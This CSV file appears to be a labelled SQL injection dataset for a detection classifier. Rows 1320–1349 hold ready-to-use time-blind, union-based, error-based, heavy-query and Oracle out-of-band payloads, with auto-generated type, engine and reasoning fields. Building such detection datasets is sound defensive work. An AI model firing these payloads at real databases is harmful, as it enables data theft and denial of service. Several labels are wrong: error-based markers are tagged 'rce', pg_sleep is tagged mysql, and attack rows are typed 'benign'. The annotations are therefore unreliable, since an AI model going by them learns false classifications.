row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
1320,"1"" ) where 4567 = 4567 or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
1321,"1"" and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual )",1,,error_based,oracle,0.95,xmltype ( detected — error_based injection (priority 4) on oracle,rule-based
1322,"1' ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( 'rxxb' = 'rxxb",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1323,1 ) where 2232 = 2232,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1324,"-3637"" or ( 8459 = 8459 ) *4906",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1325,1' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
1326,"1' ) ) as xntz where 5801 = 5801 or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) --",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
1327,"iif ( 2452 = 8999,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
1328,1' ) as bihs where 4197 = 4197,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1329,"-7531' ) union all select 3072,3072,3072,3072,3072,3072,3072--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1330,"1 ) ) ) union all select null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1331,"waitfor delay '0:0:5' and ( ""ludp"" like ""ludp",1,,time_blind,mssql,0.95,waitfor delay is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1332,1 ) where 7680 = 7680 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --,1,,error_based,oracle,0.95,dbms_utility detected — error_based injection (priority 4) on oracle,rule-based
1333,1'|| ( select 'fwph' where 3791 = 3791,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1334,"1' ) ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'xtdj' = 'xtdj",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
1335,-2981 ) ) or ( 8459 = 8459 ) *4906 and ( ( 4202 = 4202,1,,boolean_blind,generic,0.95,) or ( detected — boolean_blind injection (priority 8) on generic,rule-based
1336,1'|| ( select 'tvcy' where 5592 = 5592 order by 1#,1,,boolean_blind,generic,0.95,5592 = 5592 or detected — boolean_blind injection (priority 8) on generic,rule-based
1337,"-5320 where 8051 = 8051 or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",1,,error_based,oracle,0.95,ctxsys detected — error_based injection (priority 4) on oracle,rule-based
1338,"1%' ) ) ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) and ( ( ( '%' = '",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
1339,1 where 5691 = 5691 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1340,"select sleep ( 5 ) and ""cyrb"" = ""cyrb",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1341,1' ) and 4386 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4386 = 4386 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) and ( 'jhlj' = 'jhlj,1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
1342,1 ) as oknr where 3228 = 3228,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
1343,"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
1344,"1"" ) as gtpi where 8100 = 8100 and make_set ( 2678 = 9169,9169 ) --",1,,boolean_blind,generic,0.95,8100 = 8100 and detected — boolean_blind injection (priority 8) on generic,rule-based
1345,"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue",1,,time_blind,sqlite,0.95,randomblob ( is SQLite-specific time-delay function — time-based blind inference (priority 5),rule-based
1346,"-8490 ) ) union all select 6910,6910,6910,6910,6910,6910#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1347,"1 ) ) ) union all select null,null,null,null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1348,"1"" union all select null,null,null,null--",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
1349,"1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
